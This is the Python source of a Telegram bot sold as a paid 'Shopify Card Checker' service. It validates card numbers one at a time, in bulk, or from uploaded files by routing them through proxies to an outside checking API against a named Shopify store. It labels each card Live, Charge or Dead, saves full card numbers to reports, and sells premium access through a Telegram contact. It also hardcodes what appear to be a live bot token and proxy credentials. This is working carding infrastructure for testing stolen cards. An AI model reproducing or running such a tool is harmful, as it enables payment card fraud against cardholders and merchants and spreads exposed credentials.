import os
import json
import logging
import random
import string
import re
import requests
import time
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ============== CONFIGURATION ==============
BOT_TOKEN = "8854554558:AAEiuvp-nKrlrI2Hfhz6gmo8WQ8jaNq9d1s"
OWNER_ID = 8570832903
API_URL = "https://nik.cards/shopify"
DEFAULT_PROXY = "ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
SITE = "https://aha-wrap.myshopify.com/"
FREE_SINGLE_LIMIT = 131
FREE_BULK_LIMIT = 1000

# ============== DATABASE ==============
class Database:
    def __init__(self):
        self.db_file = "database.json"
        self.history_file = "history.json"
        self.reports_file = "reports.csv"
        self._init_files()
        self.data = self._load_data()

    def _init_files(self):
        if not os.path.exists(self.db_file):
            with open(self.db_file, 'w') as f:
                json.dump({"users": {}, "redeem_codes": {}, "stats": {"total_checks": 0, "total_users": 0, "total_redeems": 0}}, f, indent=4)
        if not os.path.exists(self.history_file):
            with open(self.history_file, 'w') as f:
                json.dump([], f, indent=4)
        if not os.path.exists(self.reports_file):
            with open(self.reports_file, 'w') as f:
                f.write("Timestamp,User_ID,Username,Card,Status,Charge,Proxy,Type\n")
        if not os.path.exists("logs"):
            os.makedirs("logs")

    def _load_data(self):
        try:
            with open(self.db_file, 'r') as f:
                return json.load(f)
        except:
            return {"users": {}, "redeem_codes": {}, "stats": {"total_checks": 0, "total_users": 0, "total_redeems": 0}}

    def _save_data(self):
        with open(self.db_file, 'w') as f:
            json.dump(self.data, f, indent=4)

    def _save_history(self, entry):
        try:
            with open(self.history_file, 'r') as f:
                history = json.load(f)
        except:
            history = []
        history.append(entry)
        with open(self.history_file, 'w') as f:
            json.dump(history, f, indent=4)

    def _save_report(self, user_id, username, card, status, charge, proxy, check_type):
        with open(self.reports_file, 'a') as f:
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')},{user_id},{username},{card},{status},{charge},{proxy},{check_type}\n")

    def get_user(self, user_id):
        return self.data["users"].get(str(user_id))

    def create_user(self, user_id, username, first_name, last_name):
        uid = str(user_id)
        if uid not in self.data["users"]:
            self.data["users"][uid] = {
                "user_id": uid,
                "username": username or "Unknown",
                "first_name": first_name or "Unknown",
                "last_name": last_name or "",
                "plan": "free",
                "expiry_date": None,
                "credits": FREE_SINGLE_LIMIT,
                "joined_date": datetime.now().isoformat(),
                "total_checks": 0,
                "proxies": [],
                "active_proxy": None
            }
            self.data["stats"]["total_users"] += 1
            self._save_data()
            return True
        return False

    def update_user_plan(self, user_id, plan, duration):
        uid = str(user_id)
        if uid in self.data["users"]:
            expiry = None if duration == 'lifetime' else (datetime.now() + timedelta(days=int(duration.replace('d', '')))).isoformat() if duration != 'lifetime' else 'lifetime'
            self.data["users"][uid]["plan"] = plan
            self.data["users"][uid]["expiry_date"] = expiry
            self._save_data()

    def add_credits(self, user_id, credits):
        uid = str(user_id)
        if uid in self.data["users"]:
            self.data["users"][uid]["credits"] += credits
            self._save_data()

    def deduct_credits(self, user_id, amount):
        uid = str(user_id)
        if uid in self.data["users"]:
            self.data["users"][uid]["credits"] -= amount
            self._save_data()

    def get_user_credits(self, user_id):
        user = self.get_user(user_id)
        return user["credits"] if user else 0

    def get_user_plan(self, user_id):
        user = self.get_user(user_id)
        return (user["plan"], user["expiry_date"]) if user else None

    def increment_checks(self, user_id):
        uid = str(user_id)
        if uid in self.data["users"]:
            self.data["users"][uid]["total_checks"] += 1
            self.data["stats"]["total_checks"] += 1
            self._save_data()

    def add_proxy(self, user_id, proxy):
        uid = str(user_id)
        if uid in self.data["users"]:
            if proxy not in self.data["users"][uid]["proxies"]:
                self.data["users"][uid]["proxies"].append(proxy)
                if not self.data["users"][uid]["active_proxy"]:
                    self.data["users"][uid]["active_proxy"] = proxy
                self._save_data()
                return True
        return False

    def remove_proxy(self, user_id, proxy):
        uid = str(user_id)
        if uid in self.data["users"] and proxy in self.data["users"][uid]["proxies"]:
            self.data["users"][uid]["proxies"].remove(proxy)
            if self.data["users"][uid]["active_proxy"] == proxy:
                self.data["users"][uid]["active_proxy"] = self.data["users"][uid]["proxies"][0] if self.data["users"][uid]["proxies"] else None
            self._save_data()
            return True
        return False

    def set_active_proxy(self, user_id, proxy):
        uid = str(user_id)
        if uid in self.data["users"] and proxy in self.data["users"][uid]["proxies"]:
            self.data["users"][uid]["active_proxy"] = proxy
            self._save_data()
            return True
        return False

    def get_user_proxies(self, user_id):
        user = self.get_user(user_id)
        return user.get("proxies", []) if user else []

    def get_active_proxy(self, user_id):
        user = self.get_user(user_id)
        return user.get("active_proxy") if user else None

    def create_redeem_code(self, code, credits, duration, created_by):
        self.data["redeem_codes"][code] = {
            "code": code,
            "credits": credits,
            "duration": duration,
            "created_by": str(created_by),
            "created_date": datetime.now().isoformat(),
            "used_by": None,
            "used_date": None,
            "is_used": False
        }
        self._save_data()
        return True

    def use_redeem_code(self, code, user_id):
        if code in self.data["redeem_codes"] and not self.data["redeem_codes"][code]["is_used"]:
            self.data["redeem_codes"][code]["used_by"] = str(user_id)
            self.data["redeem_codes"][code]["used_date"] = datetime.now().isoformat()
            self.data["redeem_codes"][code]["is_used"] = True
            self.data["stats"]["total_redeems"] += 1
            self._save_data()
            return True
        return False

    def get_redeem_code(self, code):
        return self.data["redeem_codes"].get(code)

    def add_check_history(self, user_id, card, status, charge, proxy, is_bulk=0):
        entry = {
            "user_id": str(user_id),
            "card_number": card,
            "status": status,
            "charge_amount": charge,
            "proxy": proxy,
            "checked_date": datetime.now().isoformat(),
            "is_bulk": is_bulk
        }
        self._save_history(entry)
        self.increment_checks(user_id)
        user = self.get_user(user_id)
        username = user["username"] if user else "Unknown"
        self._save_report(user_id, username, card, status, charge, proxy, "Bulk" if is_bulk else "Single")

    def get_check_count(self, user_id, is_bulk=0):
        try:
            with open(self.history_file, 'r') as f:
                history = json.load(f)
        except:
            return 0
        today = datetime.now().date()
        count = 0
        for entry in history:
            if entry["user_id"] == str(user_id) and entry["is_bulk"] == is_bulk:
                if datetime.fromisoformat(entry["checked_date"]).date() == today:
                    count += 1
        return count

    def get_user_stats(self, user_id):
        user = self.get_user(user_id)
        if not user:
            return None
        try:
            with open(self.history_file, 'r') as f:
                history = json.load(f)
        except:
            history = []
        total = live = dead = unknown = charge = 0
        for entry in history:
            if entry["user_id"] == str(user_id):
                total += 1
                s = entry["status"]
                if s == "Live": live += 1
                elif s == "Charge": charge += 1
                elif s == "Dead": dead += 1
                else: unknown += 1
        return {"total_checks": total, "live": live, "dead": dead, "unknown": unknown, "charge": charge}

# ============== CARD CHECKER ==============
class CardChecker:
    def __init__(self):
        self.api_url = API_URL
        self.site = SITE

    def check_card(self, card_number, proxy_string=None):
        proxy_to_use = proxy_string if proxy_string else DEFAULT_PROXY
        try:
            parts = proxy_to_use.split(':')
            proxies = None
            if len(parts) == 4:
                host, port, user, passwd = parts
                proxy_url = f"http://{user}:{passwd}@{host}:{port}"
                proxies = {"http": proxy_url, "https": proxy_url}
            params = {'site': self.site, 'cc': card_number, 'proxy': proxy_to_use}
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json'
            }
            resp = requests.get(self.api_url, params=params, proxies=proxies, headers=headers, timeout=30)
            data = resp.json()
            if 'status' in data:
                status = data['status'].lower()
                charge = data.get('charge', '0.00')
                if status in ('live', 'success'):
                    return ('Live', charge, data, proxy_to_use)
                elif status in ('charge', 'charged'):
                    return ('Charge', charge, data, proxy_to_use)
                elif status in ('dead', 'failed', 'error'):
                    return ('Dead', '0.00', data, proxy_to_use)
                else:
                    return ('Unknown', '0.00', data, proxy_to_use)
            else:
                return ('Unknown', '0.00', data, proxy_to_use)
        except Exception as e:
            return ('Unknown', '0.00', {'error': str(e)}, proxy_to_use)

# ============== HELPERS ==============
def validate_card(card):
    card = re.sub(r'\s+', '', card)
    if not card.isdigit() or len(card) < 13 or len(card) > 19:
        return False
    total = 0
    for i, d in enumerate(reversed(card)):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def format_card(card):
    return f"{card[:4]}****{card[-4:]}" if len(card) >= 16 else card

def parse_file_content(content):
    return [line.strip() for line in content.split('\n') if line.strip() and validate_card(line.strip())]

def validate_proxy(proxy):
    parts = proxy.split(':')
    return len(parts) == 4 and parts[0] and parts[1].isdigit() and parts[2] and parts[3]

class RedeemCodeManager:
    @staticmethod
    def generate_code(length=12):
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# ============== BOT HANDLERS ==============
db = Database()
checker = CardChecker()
code_manager = RedeemCodeManager()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db.create_user(user.id, user.username, user.first_name, user.last_name)
    await update.message.reply_text(
        f"🎯 Welcome to Shopify Card Checker Bot!\n\n"
        f"Hi {user.first_name}! Use /help for commands.",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📚 Commands:\n"
        f"/sh <card> – single check\n"
        f"/msh <card1|card2> – multiple\n"
        f"/chk – reply to .txt file\n"
        f"/proxy – manage proxies\n"
        f"/redeem <code> – redeem premium\n"
        f"/plan – your plan & credits\n"
        f"/stats – your stats\n"
        f"/buy – premium plans\n"
        f"/get_red <credits> <duration> – owner only\n\n"
        f"Proxy format: host:port:user:pass",
        parse_mode='Markdown'
    )

async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /sh <card>")
        return
    card = context.args[0].strip()
    if not validate_card(card):
        await update.message.reply_text("Invalid card number.")
        return
    user_plan = db.get_user_plan(user_id)
    is_premium = user_plan and user_plan[0] != 'free'
    if not is_premium and db.get_user_credits(user_id) <= 0:
        await update.message.reply_text("No credits. Buy premium with /buy.")
        return
    proxy = db.get_active_proxy(user_id) or DEFAULT_PROXY
    if not is_premium:
        db.deduct_credits(user_id, 1)
    msg = await update.message.reply_text("Checking...")
    status, charge, data, used_proxy = checker.check_card(card, proxy)
    db.add_check_history(user_id, card, status, charge, used_proxy)
    emoji = {"Live":"✅","Charge":"💰","Dead":"❌","Unknown":"❓"}.get(status,"❓")
    reply = f"💳 Shopify Result\n\nCard: `{format_card(card)}`\nStatus: {emoji} *{status}*\n"
    if status == "Charge":
        reply += f"Amount: *${charge}*\n"
    reply += f"Proxy: `{used_proxy[:30]}...`\n"
    if not is_premium:
        reply += f"\nRemaining credits: {db.get_user_credits(user_id)}"
    await msg.edit_text(reply, parse_mode='Markdown')

async def multi_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /msh <card1|card2|...>")
        return
    cards = [c.strip() for c in context.args[0].split('|') if c.strip() and validate_card(c.strip())]
    if not cards:
        await update.message.reply_text("No valid cards.")
        return
    user_plan = db.get_user_plan(user_id)
    is_premium = user_plan and user_plan[0] != 'free'
    if not is_premium:
        if db.get_user_credits(user_id) <= 0:
            await update.message.reply_text("No credits.")
            return
        daily = db.get_check_count(user_id)
        if daily >= FREE_SINGLE_LIMIT:
            await update.message.reply_text(f"Daily free limit ({FREE_SINGLE_LIMIT}) reached.")
            return
        limit = min(len(cards), db.get_user_credits(user_id), FREE_SINGLE_LIMIT - daily)
        cards = cards[:limit]
    if not cards:
        await update.message.reply_text("No cards to check.")
        return
    proxy = db.get_active_proxy(user_id) or DEFAULT_PROXY
    msg = await update.message.reply_text(f"Checking {len(cards)} cards...")
    results = []
    for i, card in enumerate(cards):
        status, charge, data, used_proxy = checker.check_card(card, proxy)
        db.add_check_history(user_id, card, status, charge, used_proxy)
        if not is_premium:
            db.deduct_credits(user_id, 1)
        results.append((card, status, charge))
        if (i+1) % 5 == 0:
            await msg.edit_text(f"Progress: {i+1}/{len(cards)}")
    reply = f"📊 Results ({len(results)} cards)\nProxy: `{proxy[:30]}...`\n\n"
    live = charge = dead = unknown = 0
    for card, status, amt in results:
        emoji = {"Live":"✅","Charge":"💰","Dead":"❌","Unknown":"❓"}.get(status,"❓")
        reply += f"{emoji} `{format_card(card)}` → *{status}*"
        if status in ("Live","Charge"):
            reply += f" (${amt})"
        reply += "\n"
        if status == "Live": live += 1
        elif status == "Charge": charge += 1
        elif status == "Dead": dead += 1
        else: unknown += 1
    summary = f"\n✅ Live: {live}  💰 Charge: {charge}  ❌ Dead: {dead}  ❓ Unknown: {unknown}"
    if not is_premium:
        summary += f"\nRemaining credits: {db.get_user_credits(user_id)}"
    await msg.edit_text(reply + summary, parse_mode='Markdown')

async def file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not update.message.document or not update.message.document.file_name.endswith('.txt'):
        await update.message.reply_text("Please send a .txt file.")
        return
    user_plan = db.get_user_plan(user_id)
    is_premium = user_plan and user_plan[0] != 'free'
    if not is_premium:
        if db.get_user_credits(user_id) <= 0:
            await update.message.reply_text("No credits.")
            return
        limit = FREE_BULK_LIMIT
    else:
        limit = float('inf')
    proxy = db.get_active_proxy(user_id) or DEFAULT_PROXY
    msg = await update.message.reply_text("Downloading file...")
    try:
        file = await update.message.document.get_file()
        content = (await file.download_as_bytearray()).decode('utf-8')
        cards = parse_file_content(content)
        if not cards:
            await msg.edit_text("No valid cards found.")
            return
        cards_to_check = cards[:limit] if limit != float('inf') else cards
        await msg.edit_text(f"Checking {len(cards_to_check)} cards...")
        results = []
        for i, card in enumerate(cards_to_check):
            status, charge, data, used_proxy = checker.check_card(card, proxy)
            db.add_check_history(user_id, card, status, charge, used_proxy, is_bulk=1)
            if not is_premium:
                db.deduct_credits(user_id, 1)
            results.append((card, status, charge))
            if (i+1) % 10 == 0:
                await msg.edit_text(f"Progress: {i+1}/{len(cards_to_check)}")
        # Build report safely
        report_lines = []
        report_lines.append("Shopify Card Validation Report")
        report_lines.append("=" * 50)
        report_lines.append(f"Gateway: {SITE}")
        report_lines.append(f"Proxy: {proxy}")
        report_lines.append("=" * 50)
        report_lines.append("")
        live = charge = dead = unknown = 0
        for card, status, amt in results:
            line = f"Card: {card} | Status: {status}"
            if status in ("Live","Charge"):
                line += f" | Charge: ${amt}"
            report_lines.append(line)
            if status == "Live": live += 1
            elif status == "Charge": charge += 1
            elif status == "Dead": dead += 1
            else: unknown += 1
        report_lines.append("")
        report_lines.append(f"Summary: Live: {live}, Charge: {charge}, Dead: {dead}, Unknown: {unknown}")
        if not is_premium:
            report_lines.append(f"Remaining credits: {db.get_user_credits(user_id)}")
        report_content = "\n".join(report_lines)
        filename = f"report_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(report_content)
        with open(filename, 'rb') as f:
            await update.message.reply_document(document=f, filename=filename, caption="Report ready.")
        os.remove(filename)
        summary = f"✅ Done! {len(results)} cards checked.\nLive: {live}, Charge: {charge}, Dead: {dead}, Unknown: {unknown}"
        if not is_premium:
            summary += f"\nRemaining credits: {db.get_user_credits(user_id)}"
        await msg.edit_text(summary)
    except Exception as e:
        await msg.edit_text(f"Error: {str(e)}")

async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        proxies = db.get_user_proxies(user_id)
        active = db.get_active_proxy(user_id)
        text = f"🌐 Proxy Management\nTotal: {len(proxies)}\nActive: {active if active else 'Default'}\n\nCommands:\n/proxy add host:port:user:pass\n/proxy list\n/proxy set host:port:user:pass\n/proxy remove host:port:user:pass\n/proxy active\n/proxy default"
        await update.message.reply_text(text, parse_mode='Markdown')
        return
    action = context.args[0].lower()
    if action == "add" and len(context.args) == 2:
        proxy = context.args[1]
        if not validate_proxy(proxy):
            await update.message.reply_text("Invalid format. Use host:port:user:pass")
            return
        if db.add_proxy(user_id, proxy):
            await update.message.reply_text(f"Proxy added: {proxy}")
        else:
            await update.message.reply_text("Proxy already exists.")
    elif action == "list":
        proxies = db.get_user_proxies(user_id)
        active = db.get_active_proxy(user_id)
        if not proxies:
            await update.message.reply_text("No proxies saved.")
            return
        text = "📋 Your proxies:\n"
        for i, p in enumerate(proxies, 1):
            text += f"{'👉 ' if p == active else '   '}{i}. {p}\n"
        await update.message.reply_text(text)
    elif action == "set" and len(context.args) == 2:
        proxy = context.args[1]
        if db.set_active_proxy(user_id, proxy):
            await update.message.reply_text(f"Active proxy set to: {proxy}")
        else:
            await update.message.reply_text("Proxy not found.")
    elif action == "remove" and len(context.args) == 2:
        proxy = context.args[1]
        if db.remove_proxy(user_id, proxy):
            await update.message.reply_text(f"Proxy removed: {proxy}")
        else:
            await update.message.reply_text("Proxy not found.")
    elif action == "active":
        active = db.get_active_proxy(user_id) or "Default"
        await update.message.reply_text(f"Active proxy: {active}")
    elif action == "default":
        if db.set_active_proxy(user_id, DEFAULT_PROXY):
            await update.message.reply_text("Switched to default proxy.")
        else:
            await update.message.reply_text("Could not set default.")
    else:
        await update.message.reply_text("Unknown proxy command.")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /redeem <code>")
        return
    code = context.args[0].upper()
    data = db.get_redeem_code(code)
    if not data:
        await update.message.reply_text("Invalid code.")
        return
    if data["is_used"]:
        await update.message.reply_text("Code already used.")
        return
    credits = data["credits"]
    duration = data["duration"]
    db.update_user_plan(user_id, 'premium', duration)
    db.add_credits(user_id, credits)
    db.use_redeem_code(code, user_id)
    await update.message.reply_text(f"✅ Redeemed! +{credits} credits, premium until {db.get_user_plan(user_id)[1]}")

async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    plan = db.get_user_plan(user_id)
    credits = db.get_user_credits(user_id)
    proxies = db.get_user_proxies(user_id)
    active = db.get_active_proxy(user_id) or "Default"
    text = f"📊 Your Plan\nPlan: {plan[0].upper() if plan else 'Free'}\nExpiry: {plan[1] if plan and plan[1] else 'N/A'}\nCredits: {credits}\nProxies: {len(proxies)}\nActive proxy: {active}"
    await update.message.reply_text(text)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if context.args and context.args[0] == 'all' and user_id == OWNER_ID:
        stats = db.data["stats"]
        text = f"📊 Bot Stats\nUsers: {stats['total_users']}\nChecks: {stats['total_checks']}\nRedeems: {stats['total_redeems']}\nCodes: {len(db.data['redeem_codes'])}"
        await update.message.reply_text(text)
        return
    stats = db.get_user_stats(user_id)
    if not stats:
        await update.message.reply_text("No stats yet.")
        return
    text = f"📊 Your Stats\nTotal checks: {stats['total_checks']}\nLive: {stats['live']}\nCharge: {stats['charge']}\nDead: {stats['dead']}\nUnknown: {stats['unknown']}"
    await update.message.reply_text(text)

async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💎 Premium Plans:\n"
        "1 Day – ₹250\n"
        "1 Month – ₹500\n"
        "1 Year – ₹1000\n"
        "Lifetime – ₹2500\n\n"
        "Contact @theaadikoder to buy."
    )

async def get_red_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Unauthorized.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /get_red <credits> <duration> (e.g., 300 1m)")
        return
    try:
        credits = int(context.args[0])
        duration = context.args[1]
        if not duration.endswith(('m','y','d')):
            duration += 'd'
        code = code_manager.generate_code()
        db.create_redeem_code(code, credits, duration, OWNER_ID)
        await update.message.reply_text(f"Code generated: `{code}`\nCredits: {credits}\nDuration: {duration}", parse_mode='Markdown')
    except:
        await update.message.reply_text("Invalid input.")

async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Unknown command. Use /help.")

# ============== MAIN ==============
def main():
    logging.basicConfig(level=logging.INFO)
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("sh", single_check))
    app.add_handler(CommandHandler("msh", multi_check))
    app.add_handler(CommandHandler("chk", file_check))
    app.add_handler(CommandHandler("proxy", proxy_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("plan", plan_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("buy", buy_command))
    app.add_handler(CommandHandler("get_red", get_red_command))
    app.add_handler(MessageHandler(filters.Document.ALL, file_check))
    app.add_handler(MessageHandler(filters.COMMAND, unknown))
    print("Bot started!")
    app.run_polling()

if __name__ == "__main__":
    main()
